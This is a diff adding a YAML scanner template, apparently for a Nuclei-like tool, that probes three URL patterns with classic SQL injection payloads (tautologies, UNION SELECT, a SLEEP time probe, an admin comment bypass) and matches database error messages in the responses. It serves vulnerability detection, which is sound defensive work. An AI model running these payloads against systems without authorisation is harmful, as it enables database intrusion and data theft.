@@ -1,0 +1,79 @@
+id: test-sqli
+info:
+  name: Test SQL Injection Template
+  author: Anarchy Copilot Team
+  severity: high
+  description: Test template for SQL injection detection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/id={{injection}}"
+      - "{{BaseURL}}/search?q={{injection}}"
+      - "{{BaseURL}}/api/query?filter={{injection}}"
+    
+    payloads:
+      injection:
+        - "' OR '1'='1"
+        - "1 UNION SELECT NULL--"
+        - "1' AND SLEEP(1)--"
+        - "1' AND '1'='1"
+        - "admin' --"
+        - "1' ORDER BY 1--"
+
+    headers:
+      User-Agent: Mozilla/5.0 AnarchyCopilot/Test
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "PostgreSQL.*ERROR"
+          - "Driver.*SQL[\-\_\ ]*Server"
+          - "OLE DB.*SQL Server"
+          - "Warning.*sqlite_"
+          - "Oracle.*ORA-[0-9][0-9][0-9][0-9]"
+          - "Microsoft Access Driver"
+        part: response
+
+      - type: word
+        words:
+          - "MariaDB"
+          - "MySQL"
+          - "PostgreSQL"
+          - "SQL Server"
+          - "ORA-"
+        condition: or
+        part: response
+
+      - type: status
+        status:
+          - 500
+        condition: or
+
+    extractors:
+      - type: regex
+        name: sql_errors
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "PostgreSQL.*ERROR"
+          - "Driver.*SQL[\-\_\ ]*Server"
+          - "OLE DB.*SQL Server"
+          - "Warning.*sqlite_"
+          - "Oracle.*ORA-[0-9][0-9][0-9][0-9]"
+        group: 0
+
+    stop-at-first-match: true
+    max-redirects: 3
+    redirects: true
+    
+    # Enable dynamic correlation for time-based tests
+    dynamic-correlation:
+      - type: time
+        duration: 2
+        delay: 1
+        variance: 0.5
